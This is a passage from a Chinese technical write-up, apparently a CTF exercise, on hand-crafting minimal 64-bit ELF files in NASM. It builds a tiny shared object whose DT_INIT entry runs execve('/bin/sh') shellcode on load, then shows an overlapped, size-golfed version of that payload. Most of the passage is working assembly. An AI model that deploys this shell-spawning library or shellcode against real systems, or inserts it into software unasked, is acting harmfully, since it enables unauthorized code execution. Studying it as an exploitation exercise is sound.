        pop rax
        syscall
    filesize      equ     $ - $$
使用`nasm -f bin -o a.out My_test.s`命令编译
可以发现，它现在仅有147个字节。
### 构建`Mini-shared object`
接下来需要构建一个共享库文件，对于共享库文件，[ELF规范](https://uclibc.org/docs/elf-64-gen.pdf)要求有两个程序标头，分别定义一个`LOADable`段和一个`DYNAMIC`段，并且接下来要求有四个程序节区，分别是：
  1. `SYMTAB`节：用于存放我们需要覆盖的符号。
  2. `STRTAB`节：用于存放我们所需要的字符串。
  3. `text`节：用于存放我们需要执行的`ShellCode`。
  4. `DYNSYM`节。
那么我们构建的结果如下所示，
    ; My_test.s
    BITS 64
        org     0x00400000
    ehdr:                                               ;   Elf64_Ehdr
                db      0x7F, "ELF", 2, 1, 1, 0         ;   e_ident
        times 8 db      0
                dw      3                               ;   e_type
                dw      62                              ;   e_machine
                dd      1                               ;   e_version
                dq      _start                          ;   e_entry
                dq      phdr - $$                       ;   e_phoff
                dq      sectionHeaders - $$             ;   e_shoff
                dd      0                               ;   e_flags
                dw      ehdrsize                        ;   e_ehsize
                dw      phdrsize                        ;   e_phentsize
                dw      2                               ;   e_phnum
                dw      64                              ;   e_shentsize
                dw      6                               ;   e_shnum
                dw      4                               ;   e_shstrndx
    ehdrsize    equ     $ - ehdr
    phdr:                                               ;   Elf64_Phdr
        phdr_loadable:
                dd      1                               ;   p_type
                dd      7                               ;   p_flags
                dq      0                               ;   p_offset
                dq      $$                              ;   p_vaddr
                dq      $$                              ;   p_paddr
                dq      filesize                        ;   p_filesz
                dq      filesize                        ;   p_memsz
                dq      0x1000                          ;   p_align
    phdrsize    equ     $ - phdr
        phdr_dynamic:
                dd      2                               ;   p_type
                dd      7                               ;   p_flags
                dq      dynamic                         ;   p_offset
                dq      dynamic                         ;   p_vaddr
                dq      dynamic                         ;   p_paddr
                dq      dynamicsize                     ;   p_filesz
                dq      dynamicsize                     ;   p_memsz
                dq      0x1000                          ;   p_align
    main:
        _start:
                xor rsi,rsi
                cdq
                push rsi
                mov rdi , 0x68732f6e69622f
                push rdi
                push rsp
                pop rdi
                push rsi
                push rdi
                push rsp
                pop rsi 
                push 0x3b
                pop rax
                syscall
    mainsize    equ     $ - main
    sectionHeaders:
        section_dynsym:
                dd      1               ;sh_name
                dd      11              ;sh_type DYNSYM
                dq      7               ;sh_flags rx
                dq      dynsym          ;sh_addr
                dq      dynsym          ;sh_offset
                dq      dynsymsize      ;sh_size
                dd      3               ;sh_link
                dd      1               ;sh_info
                dq      1               ;sh_addralign
                dq      24              ;sh_entsize
        section_text:
                dd      19              ;sh_name
                dd      1               ;sh_type PROGBITS
                dq      7               ;sh_flags rx
                dq      main            ;sh_addr
                dq      main            ;sh_offset
                dq      mainsize        ;sh_size
                dd      3               ;sh_link
                dd      0               ;sh_info
                dq      1               ;sh_addralign
                dq      0               ;sh_entsize
        section_shstrtab:
                dd      9               ;sh_name
                dd      3               ;sh_type STRTAB
                dq      7               ;sh_flags rx
                dq      shstrtab        ;sh_addr
                dq      shstrtab        ;sh_offset
                dq      shstrtabsize    ;sh_size
                dd      0               ;sh_link
                dd      0               ;sh_info
                dq      1               ;sh_addralign
                dq      0               ;sh_entsize
        section_dynamic:
                dd      41               ;sh_name
                dd      6                ;sh_type SYMTAB
                dq      7                ;sh_flags rx
                dq      dynamic          ;sh_addr
                dq      dynamic          ;sh_offset
                dq      dynamicsize      ;sh_size
                dd      3                ;sh_link
                dd      0                ;sh_info
                dq      8h               ;sh_addralign
                dq      16               ;sh_entsize
    sectionHeaderssize    equ     $ - sectionHeaders
    dynsym:
        times 24 db 0
                dd      1                 ;st_name
                db      18                ;st_info global function 00010000 || 00000010
                db      0                 ;st_other
                dw      1                 ;st_shndx
                dq        _start            ;st_value
                dq      mainsize          ;st_size
    dynsymsize    equ     $ - dynsym
    dynamic:
        dt_strtab:
                dq          5
                dq          shstrtab
        dt_symtab:
                dq          6
                dq          dynsym
        dt_none:
                dq          0
                dq          0
    dynamicsize    equ     $ - dynamic 
    shstrtab:
                db          0
    shstrtabsize    equ     $ - shstrtab
    filesize    equ     $ - $$
但是我们发现，这个文件的大小是`556`字节并且并不会为我们回弹一个`shell`。
进一步查阅资料发现了如下定义
    DT_INIT 12 d_ptr Address of the initialization function
也就是说，我们只需要把`DT_INIT`指向我们的`shellcode`即可执行我们的目标函数，并且我们也不需要如此多的节区，因此我们可以删去三个无关节区，仅保留`dynsym`节区即可
    ; My_test.s
    BITS 64
        org     0x00400000
    ehdr:                                               ;   Elf64_Ehdr
                db      0x7F, "ELF", 2, 1, 1, 0         ;   e_ident
        times 8 db      0
                dw      3                               ;   e_type
                dw      62                              ;   e_machine
                dd      1                               ;   e_version
                dq      _start                          ;   e_entry
                dq      phdr - $$                       ;   e_phoff
                dq      sectionHeaders - $$             ;   e_shoff
                dd      0                               ;   e_flags
                dw      ehdrsize                        ;   e_ehsize
                dw      phdrsize                        ;   e_phentsize
                dw      2                               ;   e_phnum
                dw      64                              ;   e_shentsize
                dw      6                               ;   e_shnum
                dw      4                               ;   e_shstrndx
    ehdrsize    equ     $ - ehdr
    phdr:                                               ;   Elf64_Phdr
        phdr_loadable:
                dd      1                               ;   p_type
                dd      7                               ;   p_flags
                dq      0                               ;   p_offset
                dq      $$                              ;   p_vaddr
                dq      $$                              ;   p_paddr
                dq      filesize                        ;   p_filesz
                dq      filesize                        ;   p_memsz
                dq      0x1000                          ;   p_align
    phdrsize    equ     $ - phdr
        phdr_dynamic:
                dd      2                               ;   p_type
                dd      7                               ;   p_flags
                dq      dynamic                         ;   p_offset
                dq      dynamic                         ;   p_vaddr
                dq      dynamic                         ;   p_paddr
                dq      dynamicsize                     ;   p_filesz
                dq      dynamicsize                     ;   p_memsz
                dq      0x1000                          ;   p_align
    main:
        _start:
                xor rsi,rsi
                cdq
                push rsi
                mov rdi , 0x68732f6e69622f
                push rdi
                push rsp
                pop rdi
                push rsi
                push rdi
                push rsp
                pop rsi 
                push 0x3b
                pop rax
                syscall
                ret
    mainsize    equ     $ - main
    sectionHeaders:
        dynsym:
    dynsymsize    equ     $ - dynsym
    dynamic:
        dt_strtab:
                dq          5
                dq          dynsym
        dt_symtab:
                dq          6
                dq          dynsym
        dt_init:
                dq          12
                dq          main
    dynamicsize    equ     $ - dynamic 
    filesize    equ     $ - $$
这样，我们将程序的大小进一步缩减到了252字节，且成功回弹了shell
接下来我们发现，事实上有一些位置是可以重叠的，我们来分析一个极为精炼的exp
    ; My_test.s
    BITS 64
        org     0
    ehdr:                                               ;   Elf64_Ehdr
                db      0x7F, "ELF", 2, 1, 1, 0         ;   e_ident
        times 8 db      0
                dw      3                               ;   e_type
                dw      62                              ;   e_machine
                dd      1                               ;   e_version
                db      '/bin/sh', 0                    ;   e_entry
                dq      phdr - $$                       ;   e_phoff
        shellcode_begin:
                call    part_a                          ;   e_shoff
        part_a:
                pop     rdi
                sub     rdi, 0x15                        
                xchg    esi, eax
                push    rax
                jmp     part_b                          ;   e_phsize
                dw      phdrsize                        ;   e_phentsize
                dw      2                               ;   e_phnum
        part_b:
                push    rdi
                push    rdi
                push    rsp                      
                mov     al, 59                    
                jmp     part_c                         
    ehdrsize    equ     $ - ehdr
    phdr:                                               ;   Elf64_Phdr
        phdr_loadable:
                dd      1                               ;   p_type
                dd      7                               ;   p_flags
                dq      0                               ;   p_offset
                dq      $$                              ;   p_vaddr
        part_c:
                pop     rsi
                xor     edx, edx
                syscall
                nop
                nop
                nop
                dq      filesize                        ;   p_filesz
                dq      filesize                        ;   p_memsz
                dq      0x1000                          ;   p_align
    phdrsize    equ     $ - phdr